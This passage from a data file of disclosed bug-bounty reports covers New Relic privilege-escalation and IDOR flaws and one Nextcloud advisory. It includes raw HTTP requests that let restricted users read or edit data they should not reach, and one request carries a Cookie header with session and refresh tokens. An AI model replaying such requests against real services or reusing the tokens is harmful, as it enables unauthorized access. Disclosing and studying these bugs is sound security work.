All we have really changed here is that we've changed the GET /accounts/1523936/monitors HTTP/1.1 request to POST /accounts/1523936/alerts/99657e19-ace3-483d-a5d4-d199f09e177b/conditions.json HTTP/1.1, we added the Content-Type: application/json;charset=utf-8 header, and we added the request itself:
{""id"":181171,""accountId"":1523936,""name"":""123987"",""enabled"":true,""isDefaultPolicy"":false,""accountPolicyId"":102030,""description"":""'Check Failure' - ██████████ notification channel""}
If you get this response:
{""code"":415,""message"":""HTTP 415 Unsupported Media Type""}
It means you forgot to include the Content-Type: application/json;charset=utf-8 header in your request. 
A successful privilege escalation (if you've done the steps above correctly) will look like this:
Image F282468: Screen_Shot_2018-04-05_at_9.10.59_PM.png 385.06 KiBZoom in Zoom out Copy Download
Go back to the conditions from the Admin account, and you'll notice that the new alert condition has been added.
Impact
Privilege escalation  - restricted user to privileged user/admin within Synthetics2 attachments:F282466: Screen_Shot_2018-04-05_at_8.20.21_PM.pngF282468: Screen_Shot_2018-04-05_at_9.10.59_PM.pngnr-dm   changed the status to Triaged. Apr 6th (5 years ago)Hi @jon_bottarini,
Thank you for your report!
We've forwarded this on to the appropriate engineering team, and we'll be evaluating this issue to see how it relates with earlier permissions issue reports. We'll update this report as soon as we've finished our investigation with the engineering team.New Relic  rewarded jon_bottarini with a $750 bounty. Apr 6th (5 years ago)Hi @jon_bottarini,
We've determined that this report is eligible for a bounty.
Thank you for your report!nr-dm   changed the status to Needs more info. Jul 2nd (4 years ago)Hi @jon_bottarini,
Our engineering team has reported that this issue is resolved.
Can you verify that you're not longer able to reproduce this issue?
    
    
        
            
                
                
                
            
        
    
jon_bottarini   changed the status to New. Jul 11th (4 years ago)Hi @dmcmahon - This looks good to me. I get this error:
{""code"":403,""message"":""HTTP 403 Forbidden""}nr-dm   closed the report and changed the status to Resolved. Jul 13th (4 years ago)Hi @jon_bottarini,
Thank you for confirming that this issue has been properly resolved!
    
    
        
            
                
                
                
            
        
    
jon_bottarini   requested to disclose this report. Updated Sep 4th (2 years ago)Could you redact ██████████? Thanks! nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/334143,California,United States,San Francisco,2018,4,6,4,22
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Infrastructure] Restricted user can update integration provider account name via integrations API,"jon_bottarini  submitted a report to New Relic.Aug 20th (4 years ago)NR Infra allows you to create a GCP integration and set a custom name. By default, the restricted user account can't change anything associated associated with this type of infra integration, but there is a missing check on changing the name of the integration through the integrations API. 
Observe, the name of the integration for GCP:
(This is the URL this is found at: https://infrastructure.newrelic.com/accounts/1523936/integrations/gcp/accounts/8281) - a restricted user won't even be able to access this page. 
Image F335875: Screen_Shot_2018-08-20_at_4.30.13_PM.png 120.09 KiBZoom in Zoom out Copy Download 
All the restricted user needs to do is send the following PUT request updating the name of the integration:
Code 530 BytesWrap lines Copy Download1PUT /api/v1/accounts/1523936/provider_accounts/8281 HTTP/1.1
2Host: integrations-api.service.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
4Accept: application/json
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://infrastructure.newrelic.com/accounts/1523936/integrations/gcp/accounts/8281
8content-type: application/json
9origin: https://infrastructure.newrelic.com
10Content-Length: 18
11Cookie: mycookies
12Connection: close
13
14{""name"":""CHANGED""}
 When the admin refreshes the page they can see that the name has changed: 
Image F335877: Screen_Shot_2018-08-20_at_4.33.18_PM.png 61.01 KiBZoom in Zoom out Copy Download 
Steps to reproduce:

As an admin, create a new integration with GCP and connect your GCP account to NR (you can do this here: https://infrastructure.newrelic.com/accounts/1523936/integrations/gcp/accounts/wizard/5/step) 
Name the GCP integration anything you'd like, and once the integration is complete, login to the restricted user account
From the restricted user account, send the PUT request I posted above and change the name to something else via the {""name"":""CHANGED""} parameter within the request. 

For additional context, here is a screenshot of the permissions for the restricted user account in the user section, which shows that I shouldn't have the ability to edit the cloud integrations (the part you want to focus on is the ""Infrastructure"" section: 
Image F335879: Screen_Shot_2018-08-20_at_4.37.40_PM.png 66.82 KiBZoom in Zoom out Copy Download
Impact
Privilege escalation - restricted to admin3 attachments:F335875: Screen_Shot_2018-08-20_at_4.30.13_PM.pngF335877: Screen_Shot_2018-08-20_at_4.33.18_PM.pngF335879: Screen_Shot_2018-08-20_at_4.37.40_PM.pngnr-dm   changed the status to Triaged. Aug 21st (4 years ago)Hi @jon_bottarini,
Thank you for your reports! I've merged your other report concerning this endpoint with this one, as the root cause is the same.
I've forwarded this on to the appropriate engineering team and we'll investigate if this covers the other types of integrations as well.New Relic  rewarded jon_bottarini with a $750 bounty. Aug 21st (4 years ago)ahamlin   closed the report and changed the status to Resolved. Sep 26th (4 years ago)Hey @jon_bottarini,
We believe these issues to be resolved. Thank you for your help in keeping New Relic secure!jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/397483,California,United States,San Francisco,2018,8,20,23,38
New Relic,1001-5000,0.0,100m-200m,"$2,500.00",High,7.95,Insecure Direct Object Reference (IDOR),[NR Insights] Pull any Insights/NRQL data from any NR account,"jon_bottarini  submitted a report to New Relic.Aug 20th (4 years ago)nr-dm   changed the status to Triaged. Aug 20th (4 years ago)nr-dm   updated the severity from critical to high. Aug 20th (4 years ago)New Relic  rewarded jon_bottarini with a $2,500 bounty. Aug 20th (4 years ago)jon_bottarini   posted a comment. Aug 20th (4 years ago)nr-dm   posted a comment. Aug 21st (4 years ago)jon_bottarini   posted a comment. Aug 22nd (4 years ago)nr-dm   closed the report and changed the status to Resolved. Sep 5th (4 years ago)jon_bottarini   posted a comment. Oct 8th (4 years ago)nr-dm   posted a comment. Oct 9th (4 years ago)jon_bottarini   posted a comment. Oct 9th (4 years ago)jon_bottarini   requested to disclose this report. Oct 12th (4 years ago)nr-dm   agreed to disclose this report. Oct 15th (4 years ago)  This report has been disclosed. Oct 15th (4 years ago)Summary by jon_bottariniThis was a fun one! The full writeup is for this bug is here: https://www.jonbottarini.com/2018/10/09/get-as-image-function-pulls-any-insights-nrql-data-from-any-new-relic-account-idor/",https://hackerone.com/reports/397137,California,United States,San Francisco,2018,8,20,1,27
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Insights] Data app permissions setting does not fully prevent other users from modifying/changing changing data related to your data app ,"jon_bottarini  submitted a report to New Relic.Jul 31st (4 years ago)In NR Insights, there is the ability to set a permissions for the data app itself. It's located here: 
Image F326634: Screen_Shot_2018-07-30_at_11.14.15_PM.png 41.25 KiBZoom in Zoom out Copy Download
Now, in this section, if a user creates a new data app and sets the permissions to ""visible to others within my account"" it essentially provides read-only access to the data app and its associated variable. This permission can be defeated by another user quite easily, and to demonstrate we are going to use a match and replace rule within Burp. 
Steps to Reproduce
As the ""owner"" of the data app, navigate to https://insights.newrelic.com/apps/accounts/1523936 and click on ""Create data app""
Make sure that whatever you put here, the permissions setting is ""Visible to others in my account""
Now, from the ""restricted"" user who shouldn't have the ability to edit this data app, login to New Relic and head back to the apps section (https://insights.newrelic.com/apps/accounts/1523936)
In order to set this up correctly, go within Burp Suite Professional, then go to Proxy > Options > scroll down to ""Match and Replace"" and click on ""Add""
Within this, set the following setting:
Image F326633: Screen_Shot_2018-07-30_at_11.12.30_PM.png 33.20 KiBZoom in Zoom out Copy Download
Now, when you visit a data app that is set to ""visible to others on my account"" made by another user, you get the nice edit options in the upper right hand corner. 
Before this setting:
Image F326631: Screen_Shot_2018-07-30_at_10.49.59_PM.png 42.08 KiBZoom in Zoom out Copy Download
After enabling this setting (notice, the pencil icon):
(Note: if this doesn't happen immediately, you need to create a new data app from the restricted account and force it to refresh the data app permissions on this page). 
Image F326632: Screen_Shot_2018-07-30_at_10.58.43_PM.png 39.46 KiBZoom in Zoom out Copy Download
Now, within the restricted account you can simply click on the pencil icon and be presented with this screen, only accessible to the actual owner of the data app:
Now, as the restricted user, we can make some changes like change the name of the app which results in a PUT request, as shown below: 
Code 3.53 KiBWrap lines Copy Download1PUT /internal_api/1/accounts/1523936/collections/do-not-edit-this HTTP/1.1
2Host: insights.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://insights.newrelic.com/apps/accounts/1523936
8X-NewRelic-ID: VwUFUVRaGwsFUVZT
9X-Requested-With: XMLHttpRequest
10Content-Type: application/json;charset=utf-8
11X-CSRF-Token: kVlPVnyhkFnRDo0BOIm9ZuzLqCICj/12WUGrXeqoOLNsmTv+49M7qajUGALrFIcxnSb8grATH6tghQehZ4GpoQ==
12X-Insights-Timezone: America/Phoenix
13Content-Length: 2992
14Cookie: mycookies
15Connection: close
16
17{""id"":22071,""account_id"":1523936,""title"":""This was edited"",""slug"":""do-not-edit-this"",""icon"":""bank"",""entry_point_id"":null,""description"":""can't be edited, maybe"",""creator_id"":287480,""created_at"":""2018-07-31T05:44:01Z"",""updated_at"":""2018-07-31T05:44:01Z"",""publicity"":1,""always_show_nrql_bar"":false,""dashboards"":[{""id"":664150,""account_id"":1523936,""owner_id"":null,""title"":""Untitled"",""publicity"":1,""icon"":""bar-chart"",""created_at"":""2018-07-31T05:44:02Z"",""updated_at"":""2018-07-31T05:44:02Z"",""collection_id"":22071,""views"":0,""hidden"":false,""position"":0,""grid_column_count"":3,""description"":null,""deleted_at"":null,""filter"":null,""collection"":{""id"":22071,""account_id"":1523936,""title"":""Do not edit this"",""slug"":""do-not-edit-this"",""icon"":""bank"",""entry_point_id"":null,""description"":""can't be edited, maybe"",""creator_id"":287480,""created_at"":""2018-07-31T05:44:01Z"",""updated_at"":""2018-07-31T05:44:01Z"",""publicity"":1,""always_show_nrql_bar"":false,""creator"":{""id"":287480,""golden_gate_id"":1798917,""email"":""█████"",""is_newrelic_admin"":false,""last_account_id"":1523936,""beta_agreement_accepted_at"":null,""is_onboarded"":true,""last_onboarded_at"":""2018-07-29T23:50:32Z"",""created_at"":""2017-01-10T01:57:37Z"",""updated_at"":""2018-07-31T00:04:18Z"",""is_caring_dismissed"":null,""caring_last_shown_at"":null,""first_login_at"":null,""last_scrapbook_view"":""history"",""is_intro_dismissed"":true}},""is_entry_point"":true,""editable"":true,""deletable"":false}],""entry_point"":{""id"":664150,""account_id"":1523936,""owner_id"":null,""title"":""Untitled"",""publicity"":1,""icon"":""bar-chart"",""created_at"":""2018-07-31T05:44:02Z"",""updated_at"":""2018-07-31T05:44:02Z"",""collection_id"":22071,""views"":0,""hidden"":false,""position"":0,""grid_column_count"":3,""description"":null,""deleted_at"":null,""filter"":null,""collection"":{""id"":22071,""account_id"":1523936,""title"":""Do not edit this"",""slug"":""do-not-edit-this"",""icon"":""bank"",""entry_point_id"":null,""description"":""can't be edited, maybe"",""creator_id"":287480,""created_at"":""2018-07-31T05:44:01Z"",""updated_at"":""2018-07-31T05:44:01Z"",""publicity"":1,""always_show_nrql_bar"":false,""creator"":{""id"":287480,""golden_gate_id"":1798917,""email"":""██████"",""is_newrelic_admin"":false,""last_account_id"":1523936,""beta_agreement_accepted_at"":null,""is_onboarded"":true,""last_onboarded_at"":""2018-07-29T23:50:32Z"",""created_at"":""2017-01-10T01:57:37Z"",""updated_at"":""2018-07-31T00:04:18Z"",""is_caring_dismissed"":null,""caring_last_shown_at"":null,""first_login_at"":null,""last_scrapbook_view"":""history"",""is_intro_dismissed"":true}},""is_entry_point"":true},""creator"":{""id"":287480,""golden_gate_id"":1798917,""email"":""█████"",""is_newrelic_admin"":false,""last_account_id"":1523936,""beta_agreement_accepted_at"":null,""is_onboarded"":true,""last_onboarded_at"":""2018-07-29T23:50:32Z"",""created_at"":""2017-01-10T01:57:37Z"",""updated_at"":""2018-07-31T00:04:18Z"",""is_caring_dismissed"":null,""caring_last_shown_at"":null,""first_login_at"":null,""last_scrapbook_view"":""history"",""is_intro_dismissed"":true},""editable"":true,""publicity_editable"":false}
I changed the name of the app to: ""This was edited"". 
There's a few other things about the app itself you can change too, even though you shouldn't be able to to. A shortlist is:

The app icon
Whether or not to show the query bar
The order of the dashboards

All these functions are sent through the PUT method posted above.
Impact
Allows other users to edit your data app even though you specifically mark the app as non-editable.4 attachments:F326631: Screen_Shot_2018-07-30_at_10.49.59_PM.pngF326632: Screen_Shot_2018-07-30_at_10.58.43_PM.pngF326633: Screen_Shot_2018-07-30_at_11.12.30_PM.pngF326634: Screen_Shot_2018-07-30_at_11.14.15_PM.pngnr-dm   changed the status to Triaged. Aug 1st (4 years ago)Hi @jon_bottarini,
Thank you for your report!
We've forwarded this on to our engineers for remediation.New Relic  rewarded jon_bottarini with a $750 bounty. Aug 1st (4 years ago)ahamlin   closed the report and changed the status to Resolved. Aug 30th (4 years ago)Hey Jon, we think this one's taken care of, but definitely let us know if we're mistaken about that!
- Alex
    
    
        
            
                
                
                
            
        
    
jon_bottarini   requested to disclose this report. Updated Sep 4th (2 years ago)Can you redact █████████ from the PUT request? Thanksnr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/388743,California,United States,San Francisco,2018,7,31,6,15
New Relic,1001-5000,0.0,100m-200m,"$1,500.00",Medium,4.3,Insecure Direct Object Reference (IDOR),[NR Synthetics] (IDOR) Ability to see full name associated with other New Relic accounts through workaround of #255894,"jon_bottarini  submitted a report to New Relic.Sep 11th (5 years ago)Did you think I had fallen of the earth? Fear not - for I have returned. 
In #255894 you fixed the issue where a person could mass-harvest names of other New Relic users through the user management section. A fix was quickly pushed for this, but now I've found a workaround. I'm reporting this on the newrelic-vip program because it directly ties to a issue with Synthetics, surrounding the add users permissions feature. 
You managed to obscure the names of the accounts on the user management section: 
Image F220098: Screen_Shot_2017-09-11_at_2.33.27_PM.png 52.29 KiBZoom in Zoom out Copy Download
But, I found that I can still harvest names from the Synthetics section to add users https://synthetics.newrelic.com/accounts/1523936/permissions. 
{F220099}
Steps to reproduce:

Add a new user to the account (https://account.newrelic.com/accounts/1523936/users/new)
Enter ""123"" as the name and ""123@gmail.com"" as the email
Make them a ""user"" base role.
Click add user button.
Now, navigate to https://synthetics.newrelic.com/accounts/1523936/permissions
Click on the plus button next to ""People"", once you've made a permission group (if you haven't already got one) 
You'll be able to see the full names of any email on any account 

I've rated this using the CVSS calculator as Medium (4.3) - but depending on whether you feel that this is ""High"" confidentiality, it can be raised to a 6.5 - I was trying to be realistic. 
Let me know if you're unable to reproduce, thanks! Pleasure working with you all as usual. 1 attachment:F220098: Screen_Shot_2017-09-11_at_2.33.27_PM.png
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Sep 11th (5 years ago)Out of curiosity, does this qualify as ""High"" Cross account access since I'm able to access data relating to other accounts? Just curious as to what was needed for this level of severity. Cheers! New Relic  rewarded jon_bottarini with a $1,500 bounty. Sep 12th (5 years ago)Image F220328: rKhNazo.gif 454.99 KiBZoom in Zoom out Copy Download
Thank you for another great report! This is an interesting finding, as it really doesn't seem to fit cleanly into any of the categories defined in our policy (a sign that our policy could use some work).
I think this one falls a bit short of ""cross-account access"" – I feel that we've used the term in the past more to describe write access or significant amounts of read access to arbitrary accounts. On the other hand, this feels quite a bit heftier than most of the vulnerabilities in our 'Medium' category.
At the risk of being arbitrary, I've set the reward towards the higher end of the scale. This will provide a great discussion point for my team to review our current policy; if we do end up classifying vulnerabilities like this as 'High' severity, we will absolutely come back and make sure this reward is updated to reflect that.1 attachment:F220328: rKhNazo.gifahamlin   changed the status to Triaged. Sep 12th (5 years ago)
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Sep 12th (5 years ago)Appreciate it! Let me know if I can help in any way. I know you all and Jonathan had a call a bit back going over your scope and how to define it best - now that I play on both sides of the fence I'd be happy to assist if needed since I'm familiar with the majority of NR and what you guys offer :) - my H1 work email is jon@hackerone.com  - feel free to reach out anytime. 
Anyhow, thanks again for the generous bounty and let me know if you have any trouble reproducing this one. 
Cheers, 
Jon ahamlin   closed the report and changed the status to Resolved. Sep 25th (5 years ago)We believe this issue to be resolved – we are now obfuscating the first and last name in Synthetics in a similar way as our user management UI. Thank you again for your report!
    
    
        
            
                
                
                
            
        
    
jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)Probably best to remove the screenshots to protect our friend George. nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/267636,California,United States,San Francisco,2017,9,11,21,47
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Synthetics] Restricted user can view synthetics monitors and user permissions through .json endpoint at /permissions/securablemetadata/{GROUP ID},"jon_bottarini  submitted a report to New Relic.Feb 28th (5 years ago)This report is two reports in one, but I figured why create two reports when the root cause is essentially the same exact endpoint. 
Description
When a restricted user with no permissions to view synthetics monitors tries to navigate to the permissions settings within Synthetics (https://synthetics.newrelic.com/accounts/1523936/permissions) , they are met with a screen that looks like this: 
Image F267795: Screen_Shot_2018-02-28_at_12.02.16_AM.png 382.14 KiBZoom in Zoom out Copy Download
womp womp... Nothing happens, and no content loads. I tried to play around with this a lot, and it's locked down for the most part - but then I noticed a weird request happening in my logs, occurring at this endpoint: 
https://synthetics.newrelic.com/accounts/1523936/permissions/securablemetadata/93623194.json
Surprisingly, I was able to not only view the permissions for the account id 93623194, but I was also able to see information about all the monitor's themselves:
Image F267796: Screen_Shot_2018-02-28_at_12.07.57_AM.png 349.91 KiBZoom in Zoom out Copy Download
Steps to Reproduce:

Login to NR as a restricted user with no Synthetics permissions
Navigate to https://synthetics.newrelic.com/accounts/1523936/permissions/securablemetadata/93623194.json

Response will contain all the monitors that you don't have permission to view, and the permission details belonging to the group id 93623194.
Let me know if there is any questions, thanks! 
Jon Bottarini
Impact
Two issues here: 
As a restricted user without Synthetics permissions, I can:

See all the monitors (and private minions) on the account  and their details (Rated: Medium)
See the permissions assigned to other user accounts by changing the ""93623194"" value to another group ID above. Since the group ID is just an 8 character number, it would be trivial to bruteforce all  the possible groups and determine the permission structure quite easily. (Rated: Medium)
2 attachments:F267795: Screen_Shot_2018-02-28_at_12.02.16_AM.pngF267796: Screen_Shot_2018-02-28_at_12.07.57_AM.png
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Feb 28th (5 years ago)Correction: 
Surprisingly, I was able to not only view the permissions for the account id 93623194, but I was also able to see information about all the monitor's themselves:
should be:
Surprisingly, I was able to not only view the permissions for the group id 93623194, but I was also able to see information about all the monitors themselves:nr-dm   changed the status to Triaged. Feb 28th (5 years ago)Hi @jon_bottarini,
Thanks for submitting this report. We've confirmed this issue and forwarded it on to the appropriate engineering team.
As always, thank you for your help in keeping New Relic and our customers secure!New Relic  rewarded jon_bottarini with a $750 bounty. Feb 28th (5 years ago)Hi @jon_bottarini,
We've determined this report as eligible for a bounty.
Thank you for your report!nr-dm   closed the report and changed the status to Resolved. May 3rd (5 years ago)Hi @jon_bottarini,
We believe this issue to be resolved. Please let us know if you're still able to reproduce this issue and we can revisit it with our team.
Thanks again for your report!
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. May 3rd (5 years ago)You're working late @dmcmahon :) 
This one is indeed resolved. Cheers. nr-dm   posted a comment. May 3rd (5 years ago)(Lots to catch up on this week! 😅)jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Aug 26th (2 years ago)  This report has been disclosed. Aug 26th (2 years ago)",https://hackerone.com/reports/320689,California,United States,San Francisco,2018,2,28,8,16
New Relic,1001-5000,0.0,100m-200m,"$1,500.00",Medium,5.45,Insecure Direct Object Reference (IDOR),Permissions leaks the full name of other NR accounts - Regression of #267636,"jon_bottarini  submitted a report to New Relic.May 4th (5 years ago)One more before I run to dinner... 
Steps to Reproduce: 

Add a user to your account
Enter ""123"" as the name and ""admin@newrelic.com"" as the email
Make them a ""user"" base role.
Click add user button.
Navigate to https://synthetics.newrelic.com/accounts/1523936/permissions
Create a group
Click on the plus sign next to ""people"" 
Observe that the user you've added to the account has their full name displayed:

Image F293892: Screen_Shot_2018-05-04_at_4.17.39_PM.png 43.12 KiBZoom in Zoom out Copy Download
Bizarre, considering the other accounts are not able to be viewed and are obfuscated.
Impact
IDOR, regression of 2676361 attachment:F293892: Screen_Shot_2018-05-04_at_4.17.39_PM.png",https://hackerone.com/reports/347665,California,United States,San Francisco,2018,5,4,23,21
New Relic,1001-5000,0.0,100m-200m,$750.00,Medium,5.45,Privilege Escalation,[NR Alerts/Synthetics?] User with no Synthetics permissions can view synthetic monitor details through /internal_api/ endpoint,"jon_bottarini  submitted a report to New Relic.Feb 27th (5 years ago)Hey all, 
This one is pretty interesting. What's happening is that a user with no permissions to view synthetics will get this page when they try to navigate directly to the Synthetics monitor list (https://synthetics.newrelic.com/accounts/1523936/monitors): 
Image F267305: Restricted_View.png 346.79 KiBZoom in Zoom out Copy Download
However, the restricted user can bypass this completely by sending this GET request to the internal API at this endpoint /internal_api/1/accounts/1523936/conditions/load_synthetics_monitors:
Code 2.18 KiBWrap lines Copy Download1GET /internal_api/1/accounts/1523936/conditions/load_synthetics_monitors HTTP/1.1
2Host: alerts.newrelic.com
3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
4Accept: */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://alerts.newrelic.com/welcome?account_id=1523936
8x-xsrf-token: +ssaPGFnXG2o99S0CDVqyIvB23POTg//Xrxw5CHsEZiBX/uSxXQ+sgnBzM0li/s+tDIq+UBRobNOLkeRBa/ywg==
9origin: https://alerts.newrelic.com
10Cookie: TSNGUID=4d0c728d-ca39-4249-b618-3e03cdb2e263; ajs_user_id=2002496; ajs_group_id=1523936; ajs_anonymous_id=%221d5c30ea-a4a3-4e4c-bf81-2360e470b0a8%22; login_service_login_newrelic_com_tokens=%7B%22token%22%3A+%22CbBos73LBwhxn4oKTqky%2BqnR20SgMUHkBB7zv4ikNTtp8z4egWJCrA34AZS27i6de6TBu%2BRE2XRQyyEX1v7OlVAHolNpW7IgVXMyE9p%2FEFnLQli6F2hUeAW4JEK%2F7VoSrO7xqDz7sGG%2FtTu66eUVBAsSuY7cGRGbLCDdoakp9Z85c1ap5sqbJCbkEGDJfLQbEGLlxpiWiWI8Fn2mpzItEyVzOTkf20kGydhHQx%2FJGmN57zM3xY3K8sa31iWw6kU5rx%2F7MpjGGXUAGy1Tf3oHZCLS3uHn6UbHJ5gtO1lda5S4DKQ%2FZc0cpctAly6iqwA6%2F955J4Du4%2BDtH4yOI9lyFw%3D%3D%22%2C+%22refresh_token%22%3A+%22MBdDzazAT2KO3l6p0ilKDFWuGTAnU23sk5gf%2B10%2FTMy6PpogRw1%2BtQCR%2BemWyd9wUMVG6qAcDXHF41WSvrZOlsQftkEmP%2Fy7j4auTwUBJZw6DMJaFdJvXLhUJzljeOPLesRLuLU%2FdQ29xsGrhngrbakrJaNpgyJaFAdnaaNHxH5E%2F09Jr7t%2Bns5xCiDXSqrWBTQ48BvDlQD7LeuKry0riaUqA8gO95NtPSWLFq%2FdDEvAKv%2FicK%2FoiJXH%2B%2Bf%2FK%2F7CRMn1EGvLEUiO6JXdc9KyeqrjlEZsKOXZ7XjmaFGAW%2BZ%2FR0YvDd92O2h%2Fdq5YBXT8qT%2B0Jm95LkLzA%2FXZVNMBCw%3D%3D%22%7D; nr_zd_logged_in=true; optimizelyEndUserId=oeu1519709122916r0.9563735230431125; XSRF-TOKEN=%2BssaPGFnXG2o99S0CDVqyIvB23POTg%2F%2FXrxw5CHsEZiBX%2FuSxXQ%2BsgnBzM0li%2Fs%2BtDIq%2BUBRobNOLkeRBa%2Fywg%3D%3D; _alerting_service_ui_production_session=ZnBIWVgzUlc4d3lZYWVDSFJ3bVJqNU5RUzVrYUNwaXIwVHlOTUhDRHMrZmpjZld3N0hCOWExY3pzNjZjSEpUL3liSjNISkJIWDVKSVVMbit4b2FOR2MrY2FhcWdGeXdRVm1YMzgxcmd2WUNmYVdCZXlMM01YVDlZY0lUTDh2ZkdldWY3eldzVm9rUjlESXZnSktOVmp1ZnpWeHkwaDdudUE3SnNOOWZRekd4a0xBWU5EeHgraTd1MzZhMXNDeUx2LS1SMFpReGZoK3RGUVgyenY2RmVPa0lnPT0%3D--927238510497a0f9c1550af542246bd70852d3af; login_idle_session_timeout={""lastInteractionAt"":1519714498,""warningTime"":180,""lastIdleLimitCheck"":1519714454,""idleLimit"":1577880000}
11DNT: 1
12Connection: close
And the response will be... all the monitors and all their data (interestingly, it actually contains a bunch more data than is usually provided within Synthetics, like the API version, AWS/Linode locations, which is pretty useless to an attacker but interesting nonetheless): 
Image F267307: Screen_Shot_2018-02-26_at_11.00.50_PM.png 445.60 KiBZoom in Zoom out Copy Download
Steps to reproduce

Login to NR as a restricted user
Reload a page and intercept the request, send it to repeater in Burp so that it has your user cookies and everything
Replace the request in repeater by sending a GET request to /internal_api/1/accounts/1523936/conditions/load_synthetics_monitors 
Response will contain all the monitors that you don't have permission to view 

Let me know if this is unclear or needs additional info, thanks! 
Jon Bottarini
Impact
Standard run of the mill privilege escalation, allows under privileged user to view things they shouldn't see2 attachments:F267305: Restricted_View.pngF267307: Screen_Shot_2018-02-26_at_11.00.50_PM.pngnr-dm   changed the status to Triaged. Feb 27th (5 years ago)Hi @jon_bottarini,
Thank you for your report! We've reported this issue to the appropriate engineering team and will let you know when we have an update.
Thank you for helping keep New Relic and our customers secure!New Relic  rewarded jon_bottarini with a $750 bounty. Feb 27th (5 years ago)Hi @jon_bottarini,
We've determined this report to be eligible for a bounty.
Thank you for your report!nrjensen   posted a comment. Feb 27th (5 years ago)Nice find.  Can you give us some more information about the user that has 'no permissions to view synthetics'?  Was this restriction made within the Synthetics permissions?
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Feb 28th (5 years ago)Hi @nrjensen - Yes, this was configured within the Synthetics permission (screenshot attached, you'll notice that the ""Restricted User"" does not appear here..). but I also made sure for the ""Restricted"" user account that there wasn't the add-on permission for Synthetics enabled at https://account.newrelic.com/accounts/{ACCOUNT_ID}/users.
Am I explaining this well enough? Hopefully the screenshot helps. 
Image F267792: Screen_Shot_2018-02-27_at_11.39.43_PM.png 299.98 KiBZoom in Zoom out Copy Download1 attachment:F267792: Screen_Shot_2018-02-27_at_11.39.43_PM.png
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Jul 24th (4 years ago)Hi all - just checking on an update to this report. Thanks! ahamlin   posted a comment. Jul 24th (4 years ago)Hey @jon_bottarini,
This one hasn't fallen through the cracks! This particular vulnerability exists where two systems owned by two different teams collide, so it's been particularly tricky to untangle who owns what. I anticipate we'll have a real update for you in the near future!
Cheers,
Alex
    
    
        
            
                
                
                
            
        
    
jon_bottarini   posted a comment. Jul 24th (4 years ago)Hi @ahamlin - Good stuff. Thanks for the update! sunil_yedla   filed a duplicate (#402999) and was invited to participate in this report. Aug 30th (4 years ago)ahamlin   closed the report and changed the status to Resolved. Oct 29th (4 years ago)We took the same approach here as in your other report: scrub the important stuff, leave some innocuous stuff. Let us know if we missed anything!jon_bottarini   requested to disclose this report. Aug 20th (2 years ago)nr-dm   agreed to disclose this report. Sep 4th (2 years ago)  This report has been disclosed. Sep 4th (2 years ago)",https://hackerone.com/reports/320200,California,United States,San Francisco,2018,2,27,7,40
New Relic,1001-5000,0.0,100m-200m,$500.00,Low,2.0,Client-Side Enforcement of Server-Side Security,Giving myself access to NR1 UI / one.newrelic.com without the proper feature flags on my account,"jon_bottarini  submitted a report to New Relic.Apr 2nd (4 years ago)Summary by jon_bottariniI used Burp Suite's match/replace rules to find this issue, along with many others, and have written a blog post about using the tool here if you would like to read more: https://www.jonbottarini.com/2019/06/17/using-burp-suite-match-and-replace-settings-to-escalate-your-user-privileges-and-find-hidden-features/",https://hackerone.com/reports/520623,California,United States,San Francisco,2019,4,2,5,46
Nextcloud,11-50,0.0,1m-10m,$100.00,Low,2.0,Code Injection,[FG-VD-17-063] NextCloud Insufficient Attack Protection Vulnerability Notification,"yzy9951  submitted a report to Nextcloud.May 27th (5 years ago)Subject: [FG-VD-17-063] NextCloud Insufficient Attack Protection Vulnerability Notification

Vulnerability Notification
May 26, 2017
Tracking Case #: FG-VD-17-063
Dear NextCloud,
The following information pertains to information discovered by Fortinet's FortiGuard Labs. It has been determined that a vulnerability exists in NextCloud. To streamline the disclosure process, we have created a preliminary advisory which you can find below. This upcoming advisory is purely intended as a reference, and does not contain sensitive information such as proof of concept code. 
As a mature corporation involved in security research, we strive to responsibly disclose vulnerability information. We will not post an advisory until we determine it is appropriate to do so in co-ordination with the vendor unless a resolution cannot be reached. We will not disclose full proof of concept, only details relevant to the advisory.
We look forward to working closely with you to resolve this issue, and kindly ask for your co-operation during this time. Please let us know if you have any further questions, and we will promptly respond to address any issues. 
If this message is not encrypted, it is because we could not find your key to do so. If you have one available for use, please notify us and we will ensure that this is used in future correspondence. We ask you use our public PGP key to encrypt and communicate any sensitive information with us. You may find the key on our FortiGuard center at: http://www.fortiguard.com/pgpkey.
Type of Vulnerability & Repercussions:
Insufficient Attack Protection
Affected Product:
NextCloud 12.0.0 (stable)
Upcoming Advisory Reference:
http://www.fortiguard.com/advisory/UpcomingAdvisories.html
Credits:
This vulnerability was discovered by Fortinet's FortiGuard Labs.
